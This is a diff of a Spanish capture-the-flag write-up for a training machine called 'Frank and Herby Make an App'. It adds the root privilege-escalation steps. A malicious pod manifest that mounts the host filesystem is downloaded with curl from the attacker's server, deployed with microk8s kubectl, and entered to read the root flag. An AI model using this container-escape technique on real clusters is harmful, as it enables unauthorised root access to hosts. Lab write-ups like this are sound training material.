@@ -357,7 +357,7 @@ Por lo que ya hemos completado la fase de explotacion de la maquina hemos obteni
 
   Estructura de badpod.yaml
 
-          apiVersion: v1
+        apiVersion: v1
         kind: Pod
         metadata:
           name: esevka
@@ -382,7 +382,7 @@ Por lo que ya hemos completado la fase de explotacion de la maquina hemos obteni
             hostPath:
               path: /
 
-  4)Subimos nuestro badpod.yaml a la maquina victima
+  4)Subimos nuestro badpod.yaml a la maquina victima, o podemos crearlo desde la propia maquina.
 
   Montamos con python un servidor http para compartir ficheros.
   
@@ -392,24 +392,56 @@ Por lo que ya hemos completado la fase de explotacion de la maquina hemos obteni
 
   Desde la maquina victima nos descargamos el fichero a la carpeta /tmp
 
-      frank@dev-01:/home/herby$ curl http://10.10.209.46:31337/badpod.yaml -o /tmp/badpod.yaml
+      frank@dev-01:/tmp$ curl http://10.9.92.151/badpod.yaml -o badpod.yaml
       % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                      Dload  Upload   Total   Spent    Left  Speed
-        100   153  100   153    0     0   5666      0 --:--:-- --:--:-- --:--:--  5666
-  
-      frank@dev-01:/home/herby$ cd /tmp; ls -la 
+        100   636  100   636    0     0    794      0 --:--:-- --:--:-- --:--:--   795
+
+      frank@dev-01:/tmp$ ls -la
       total 52
-      drwxrwxrwt 12 root  root  4096 Aug 13 16:37 .
+      drwxrwxrwt 12 root  root  4096 Aug 14 15:17 .
       drwxr-xr-x 21 root  root  4096 Oct 29  2021 ..
-      -rw-rw-r--  1 frank frank  153 Aug 13 16:37 badpod.yaml
+      -rw-rw-r--  1 frank frank  636 Aug 14 15:23 badpod.yaml
+
+
+5)Creamos nuestro pod
+
+    frank@dev-01:/tmp$ microk8s kubectl apply -f badpod.yaml 
+    pod/esevka created
+    
+    frank@dev-01:/tmp$ microk8s kubectl get pods
+    NAME                                READY   STATUS    RESTARTS   AGE
+    nginx-deployment-7b548976fd-77v4r   1/1     Running   2          655d
+    esevka                              1/1     Running   0          12s
+
+
+6)Elevamos privilegios en el nodo y obtenemos la flag del usuario root.
+
+    frank@dev-01:/tmp$ microk8s kubectl exec esevka -it -- /bin/bash
+    root@dev-01:/# cd host/root
+    
+    root@dev-01:/host/root# ls -la
+    total 32
+    drwx------  4 root root 4096 Oct 29  2021 .
+    drwxr-xr-x 21 root root 4096 Oct 29  2021 ..
+    lrwxrwxrwx  1 root root    9 Oct 29  2021 .bash_history -> /dev/null
+    -rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
+    -rw-r--r--  1 root root  161 Dec  5  2019 .profile
+    drwx------  2 root root 4096 Oct  3  2021 .ssh
+    -rw-------  1 root root  705 Oct 27  2021 .viminfo
+    -rw-r--r--  1 root root   21 Oct 27  2021 root.txt
+    drwxr-xr-x  5 root root 4096 Oct  3  2021 snap
+
+    root@dev-01:/host/root# cat root.txt 
+    THM{...}
 
 
 
-
-      
-
-
-
+---
+---> Maquina Frank and Herby Make an App completa. <---
+---
+---
+    
 
 
 
